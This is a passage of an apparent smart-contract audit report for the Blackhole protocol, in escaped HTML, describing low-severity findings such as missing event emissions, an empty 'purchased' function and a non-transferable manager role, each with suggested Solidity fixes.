3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[01] Early returning in \u003ccode\u003e_blacklist()\u003c/code\u003e and \u003ccode\u003eblacklistConnector\u003c/code\u003e function prevents emission of blacklisted event and blacklistConnector event respectively\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/TokenHandler.sol#L83\"\u003eLink to the blacklist function\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/TokenHandler.sol#L131\"\u003eLink to the blacklistConnector function\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-13\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-13\" aria-label=\"finding description 13 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eIn the \u003ccode\u003e_blacklist\u003c/code\u003e function, a token is removed from the whitelist if it exists. However, the Blacklisted event — intended to log successful blacklist actions — is only emitted when the token is not found in the whiteListed array. Due to an early return statement inside the loop, the event is never emitted upon a successful removal, resulting in inconsistent logging and reduced transparency for off-chain indexers or UI components.\u003c/p\u003e\n\u003cp\u003eNOTE: The exact same issue lies in the \u003ccode\u003eblacklistConnector\u003c/code\u003e function, it returns early leading to the event not being emitted.\u003c/p\u003e\n\u003ch3 id=\"impact-13\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-13\" aria-label=\"impact 13 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eSuccessful blacklist operations are not logged via events, reducing traceability.\u003c/li\u003e\n\u003cli\u003eSuccessfully removing a token from the list of connectors are not logged via events.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-24\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-24\" aria-label=\"recommended mitigation steps 24 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eMove the emit Blacklisted(…) statement inside the for-loop and place it before the return, to ensure the event is emitted only when the token is actually removed:\u003c/p\u003e\n\u003cp\u003eFor the \u003ccode\u003e_blacklist\u003c/code\u003e function:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"78\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ewhiteListed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_token\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ewhiteListed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ewhiteListed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ewhiteListed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epop\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eBlacklisted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_token\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Emit before return\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eFor the \u003ccode\u003eblacklistConnector\u003c/code\u003e function:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"79\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003econnectors\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_token\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econnectors\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econnectors\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]; \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econnectors\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epop\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(); \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eBlacklistConnector\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_token\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 id=\"02-incomplete-implementation-of-purchased-function-in-auction-contract\" style=\"position:relative;\"\u003e\u003ca href=\"#02-incomplete-implementation-of-purchased-function-in-auction-contract\" aria-label=\"02 incomplete implementation of purchased function in auction contract permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[02] Incomplete implementation of \u003ccode\u003epurchased\u003c/code\u003e function in Auction contract\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/FixedAuction.sol#L37\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/FixedAuction.sol#L37\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-14\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-14\" aria-label=\"finding description 14 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003epurchased\u003c/code\u003e function, intended to be called upon token purchases, is declared with an empty body in the deployed Auction contract. This results in the function call succeeding without performing any state updates, event emissions, or other side effects expected from purchase tracking.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"80\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epurchased\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// empty body\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSince the function performs no operations, the auction contract does not update any internal state to reflect the purchase. This means the auction logic is incomplete.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-25\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-25\" aria-label=\"recommended mitigation steps 25 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eImplement the purchased function with appropriate logic; however, the protocol intends to use this function.\u003c/p\u003e\n\u003ch2 id=\"03-stack-too-deep-error-in-inline-assembly-variable-headstart\" style=\"position:relative;\"\u003e\u003ca href=\"#03-stack-too-deep-error-in-inline-assembly-variable-headstart\" aria-label=\"03 stack too deep error in inline assembly variable headstart permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[03] Stack too deep error in inline assembly (variable \u003ccode\u003eheadStart\u003c/code\u003e)\u003c/h2\u003e\n\u003cp\u003eThe Solidity compiler enforces a limit of 16 stack slots for local variables and parameters within a function due to EVM constraints. When a function contains too many variables, especially combined with inline assembly code that requires stack slots, the compiler throws a “stack too deep” error. In this case, the variable \u003ccode\u003eheadStart\u003c/code\u003e could not be allocated a slot inside the stack because it was already too deep.\u003c/p\u003e\n\u003ch3 id=\"impact-14\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-14\" aria-label=\"impact 14 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eCompilation Failure: The contract code cannot compile successfully, halting deployment and testing.\u003c/li\u003e\n\u003cli\u003eFunctionality Blocked: Critical functions that use this variable inside inline assembly cannot be deployed or used until the issue is resolved.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-26\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-26\" aria-label=\"recommended mitigation steps 26 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eMinimize Inline Assembly: Simplify or minimize the inline assembly code to use fewer variables or perform logic in Solidity instead.\u003c/p\u003e\n\u003ch2 id=\"04-hardcoded-manager-lacks-ability-to-renounce-control\" style=\"position:relative;\"\u003e\u003ca href=\"#04-hardcoded-manager-lacks-ability-to-renounce-control\" aria-label=\"04 hardcoded manager lacks ability to renounce control permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[04] Hardcoded manager lacks ability to renounce control\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GenesisPool.sol#L44\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GenesisPool.sol#L44\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-15\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-15\" aria-label=\"finding description 15 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe contract defines an \u003ccode\u003eonlyManager\u003c/code\u003e modifier that restricts access to certain functions exclusively to a hardcoded \u003ccode\u003egenesisManager\u003c/code\u003e address. However, there is no mechanism to transfer or renounce this privileged role, making it permanently tied to the initial deployer or assigned address.\u003c/p\u003e\n\u003ch3 id=\"impact-15\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-15\" aria-label=\"impact 15 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eThe absence of \u003ccode\u003etransferManager\u003c/code\u003e or \u003ccode\u003erenounceManager\u003c/code\u003e functions introduces centralization and governance risks. If the manager’s private key is lost, compromised, or becomes inactive, all functions guarded by \u003ccode\u003eonlyManager\u003c/code\u003e will become permanently unusable. \u003c/li\u003e\n\u003cli\u003eNo flexibility.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-27\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-27\" aria-label=\"recommended mitigation steps 27 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eAllow the current manager to securely assign a new 